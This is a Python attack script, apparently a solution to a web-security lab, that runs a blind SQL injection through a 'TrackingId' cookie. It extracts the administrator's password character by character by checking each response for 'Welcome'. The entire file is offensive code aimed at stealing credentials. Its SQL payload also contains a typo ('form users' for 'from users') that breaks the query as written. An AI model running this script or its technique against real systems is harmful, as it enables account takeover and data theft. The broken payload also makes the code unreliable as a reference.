import sys
import requests
import urllib, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password = ""
    for idx in range(1, 21):
        for ch in range(32, 126):
            payload = "' and (select ascii(substring(password,%s,1)) form users where username='administrator')='%s'--" % (idx, ch)
            payload_encoded = urllib.parse.quote(payload)
            cookie = {'TrackingId': 'tq56B0iFRvVMtLoB' + payload_encoded,  'session': 'MGF3Ht2T8weIzRwBT6Ra8kQXrCPlnbhz'}
            res = requests.get(url, cookies=cookie, verify=False)
            if 'Welcome' not in res.text:
                sys.stdout.write('\r' + password + chr(ch))
                sys.stdout.flush()
            else:
                password += chr(ch)
                sys.stdout.write('\r' + password)
                break
    print(password)

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        exit()
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)

if __name__ == '__main__':
    main()